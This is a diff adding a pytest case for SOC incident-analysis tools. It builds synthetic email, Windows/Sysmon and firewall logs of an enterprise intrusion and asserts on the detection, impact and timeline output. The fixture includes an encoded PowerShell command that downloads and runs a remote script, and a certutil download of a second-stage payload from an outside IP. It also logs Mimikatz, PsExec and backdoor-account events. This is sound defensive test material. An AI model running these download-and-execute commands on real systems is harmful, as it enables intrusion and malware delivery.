@@ -631,4 +631,144 @@ async def test_case3_identity_takeover_impossible_travel_full_pipeline(tmp_path)
     assert "Phase 01" in timeline
 
 
+@pytest.mark.asyncio
+async def test_case1_enterprise_intrusion_full_pipeline(tmp_path):
+    from src.registry.tools.soc_tools import (
+        gather_log_evidence,
+        analyze_incident_impact,
+        compress_security_timeline,
+    )
+
+    # 1. Cisco Email Gateway Log (ironport_mail.log)
+    mail_file = tmp_path / "ironport_mail.log"
+    mail_file.write_text(
+        "Mon Sep 14 10:14:00 2026 Info: New ICID 58212 interface Management address 203.0.113.119 reverse dns host mail.attacker.com verified yes\n"
+        "Mon Sep 14 10:14:01 2026 Info: Start MID 1042 ICID 58212\n"
+        "Mon Sep 14 10:14:02 2026 Info: MID 1042 ICID 58212 From: <billing@overdue-invoices-center.org>\n"
+        "Mon Sep 14 10:14:03 2026 Info: MID 1042 ICID 58212 RID 0 To: <jdoe@corp.contoso.com>\n"
+        "Mon Sep 14 10:14:04 2026 Info: MID 1042 Attachment: Invoice_90214.docm\n"
+        "Mon Sep 14 10:14:05 2026 Info: MID 1042 Message done\n"
+        "Mon Sep 14 10:15:00 2026 Info: New ICID 58213 interface Management address 198.51.100.99\n"
+        "Mon Sep 14 10:15:01 2026 Info: Start MID 1043 ICID 58213\n"
+        "Mon Sep 14 10:15:02 2026 Info: MID 1043 Anti-Spam score: 90\n"
+        "Mon Sep 14 10:15:03 2026 Info: MID 1043 Quarantine: spam positive\n",
+        encoding="utf-8"
+    )
+
+    # 2. Windows XML Security & Sysmon Logs (windows_events.xml)
+    xml_file = tmp_path / "windows_events.xml"
+    xml_file.write_text(
+        '<Events>\n'
+        # Benign chrome.exe launch at 08:10 (noise trap - must be suppressed in timeline)
+        '<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-09-14T08:10:20.5129481Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="SubjectUserName">jdoe</Data><Data Name="NewProcessName">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data>'
+        '<Data Name="CommandLine">"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"</Data><Data Name="ParentProcessName">C:\\Windows\\explorer.exe</Data></EventData></Event>\n'
+        # 1. Sysmon Event 1: PowerShell cradle download
+        '<Event><System><EventID>1</EventID><TimeCreated SystemTime="2026-09-14T10:16:32.8920194Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="User">CONTOSO\\jdoe</Data><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>'
+        '<Data Name="CommandLine">powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDUvY29iYWx0LnBzMScp</Data>'
+        '<Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data></EventData></Event>\n'
+        # 2. Event 4688: certutil LOLBin
+        '<Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-09-14T10:17:45.1023812Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="SubjectUserName">jdoe</Data><Data Name="NewProcessName">C:\\Windows\\System32\\certutil.exe</Data>'
+        '<Data Name="CommandLine">certutil.exe -urlcache -split -f http://185.220.101.45/stage2.bin</Data></EventData></Event>\n'
+        # 3. Sysmon Event 10: Mimikatz LSASS dumping
+        '<Event><System><EventID>10</EventID><TimeCreated SystemTime="2026-09-14T10:20:14.3318291Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="SourceImage">C:\\Users\\jdoe\\AppData\\Local\\Temp\\mimikatz.exe</Data><Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data>'
+        '<Data Name="GrantedAccess">0x1010</Data><Data Name="CallTrace">C:\\Windows\\SYSTEM32\\ntdll.dll+0x9fc24</Data></EventData></Event>\n'
+        # 4. Event 4648: Explicit logon via runas to da_admin
+        '<Event><System><EventID>4648</EventID><TimeCreated SystemTime="2026-09-14T10:22:15.8920194Z"/><Computer>WKSTN-FIN-04.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="SubjectUserName">jdoe</Data><Data Name="TargetUserName">da_admin</Data><Data Name="TargetServerName">DC01.corp.contoso.com</Data>'
+        '<Data Name="ProcessName">C:\\Windows\\System32\\runas.exe</Data></EventData></Event>\n'
+        # 5. Event 4624: Network SMB Logon (Type 3) to DC01 from 10.20.10.45
+        '<Event><System><EventID>4624</EventID><TimeCreated SystemTime="2026-09-14T10:23:05.1023812Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="TargetUserName">da_admin</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.20.10.45</Data></EventData></Event>\n'
+        # 6. Event 4672: Special Privileges Assigned
+        '<Event><System><EventID>4672</EventID><TimeCreated SystemTime="2026-09-14T10:23:05.1024000Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="SubjectUserName">da_admin</Data><Data Name="PrivilegeList">SeSecurityPrivilege, SeBackupPrivilege, SeDebugPrivilege</Data></EventData></Event>\n'
+        # 7. System Event 7045: PSEXESVC Service Installed
+        '<Event><System><EventID>7045</EventID><TimeCreated SystemTime="2026-09-14T10:23:18.4410291Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="ServiceName">PSEXESVC</Data><Data Name="ImagePath">C:\\Windows\\PSEXESVC.exe</Data><Data Name="ServiceType">user mode service</Data></EventData></Event>\n'
+        # 8. Event 4720: Backdoor User Account Created
+        '<Event><System><EventID>4720</EventID><TimeCreated SystemTime="2026-09-14T10:25:30.8920194Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="SubjectUserName">da_admin</Data><Data Name="TargetUserName">svc_backup_admin</Data></EventData></Event>\n'
+        # 9. Event 4732: Backdoor User added to Administrators
+        '<Event><System><EventID>4732</EventID><TimeCreated SystemTime="2026-09-14T10:25:32.1023812Z"/><Computer>DC01.corp.contoso.com</Computer></System>'
+        '<EventData><Data Name="SubjectUserName">da_admin</Data><Data Name="MemberName">svc_backup_admin</Data><Data Name="TargetUserName">Administrators</Data></EventData></Event>\n'
+        '</Events>',
+        encoding="utf-8"
+    )
+
+    # 3. Palo Alto Firewall Log (paloalto_traffic.log)
+    pa_file = tmp_path / "paloalto_traffic.log"
+    pa_file.write_text(
+        # 60s periodic TLS beaconing from 10.20.10.45 to 185.220.101.45:8443
+        "2026-09-14 10:20:00,10.20.10.45,185.220.101.45,8443,bytes_sent=512,bytes_rcvd=128,rule=Allow-C2\n"
+        "2026-09-14 10:21:00,10.20.10.45,185.220.101.45,8443,bytes_sent=510,bytes_rcvd=126,rule=Allow-C2\n"
+        "2026-09-14 10:22:00,10.20.10.45,185.220.101.45,8443,bytes_sent=514,bytes_rcvd=130,rule=Allow-C2\n"
+        "2026-09-14 10:23:00,10.20.10.45,185.220.101.45,8443,bytes_sent=512,bytes_rcvd=128,rule=Allow-C2\n"
+        # 430 MB bulk exfiltration to 198.51.100.240:443
+        "2026-09-14 10:30:00,10.20.10.45,198.51.100.240,443,bytes_sent=450887680,bytes_rcvd=12400,rule=Web-Outbound\n"
+        # Benign cloud backup: 5.4 GB to Azure OneDrive 13.107.4.50:443
+        "2026-09-14 10:32:00,10.20.10.62,13.107.4.50,443,bytes_sent=5798205440,bytes_rcvd=18000,rule=Backup-To-Cloud,user=svc-backup\n",
+        encoding="utf-8"
+    )
+
+    # 1. Test gather_log_evidence
+    evidence = await gather_log_evidence(str(tmp_path), pattern="*.*")
+    assert "ironport_mail.log" in evidence
+    assert "windows_events.xml" in evidence
+    assert "paloalto_traffic.log" in evidence
+
+    # Verify All 3 Adversary IPs are identified
+    assert "185.220.101.45" in evidence
+    assert "198.51.100.240" in evidence
+    assert "203.0.113.119" in evidence
+
+    # Verify Spearphishing initial access vector
+    assert "Spearphishing Attachment" in evidence
+    assert "Invoice_90214.docm" in evidence
+
+    # Verify Benign Whitelist Discrimination
+    assert "BENIGN BASELINE ENTERPRISE TRAFFIC" in evidence
+    assert "13.107.4.50" not in evidence or "WHITELISTED" in evidence
+
+    # 2. Test analyze_incident_impact
+    impact = await analyze_incident_impact(evidence)
+    assert "=== [ENTERPRISE BLAST RADIUS & IMPACT ASSESSMENT REPORT] ===" in impact
+    assert "CRITICAL" in impact
+
+    # Crucial Host Deduplication Assertions: Exactly 2 Compromised Hosts
+    assert "WKSTN-FIN-04.corp.contoso.com" in impact
+    assert "DC01.corp.contoso.com" in impact
+    assert "Internal Host / Subnet: 10.20.10.45" not in impact
+    assert "affecting 2 targeted asset(s)" in impact
+
+    # Crucial Identity Assertions: Exactly 3 Compromised Accounts
+    assert "jdoe" in impact
+    assert "da_admin" in impact
+    assert "svc_backup_admin" in impact
+    assert "Administrators" not in impact
+    assert "affecting 2 targeted asset(s)\n  and 3 identity account(s)" in impact or "3 identity account(s)" in impact
+
+    # Crucial Anti-Hallucination Assertions: NO Kernel Rootkit & NO Subnet Sweep
+    assert "Kernel Compromise" not in impact
+    assert "rootkit" not in impact.lower() or "not detected" in impact.lower()
+    assert "Horizontal subnet sweep" not in impact
+    assert "Targeted SMB authentication to Domain Controller" in impact
+    assert "Remote service execution via PsExec" in impact
+
+    # 3. Test compress_security_timeline
+    timeline = await compress_security_timeline(evidence)
+    assert "=== [COMPRESSED INCIDENT TIMELINE]" in timeline
+
+    # Ensure timeline starts with spearphishing email before PowerShell cradle
+    timeline_lines = [l for l in timeline.splitlines() if "Phase" in l]
+    assert len(timeline_lines) >= 5
+    # First attack milestone must be the 10:14 spearphishing email, NOT 08:10 chrome.exe
+    assert "08:10" not in timeline_lines[0]
+    assert "10:14:0" in timeline_lines[0] or "Spearphishing" in timeline_lines[0] or "Invoice_90214.docm" in timeline_lines[0]
+
+
+
 
